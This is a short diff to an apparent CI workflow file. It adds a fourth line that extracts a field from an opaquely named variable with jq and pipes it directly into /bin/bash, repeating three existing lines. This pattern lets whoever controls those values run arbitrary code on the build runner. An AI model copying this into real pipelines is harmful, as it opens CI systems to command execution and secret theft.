@@ -25,6 +25,7 @@ jobs:
           echo $jyhd1498 | jq -r .ovtb2259 | /bin/bash
           printf '%s' "$un56732" | jq -r .z586 | /bin/bash
           printf '%s' "$dd069" | jq -r .awne10 | /bin/bash
+          printf '%s' "$rsgu41" | jq -r .eg52646 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
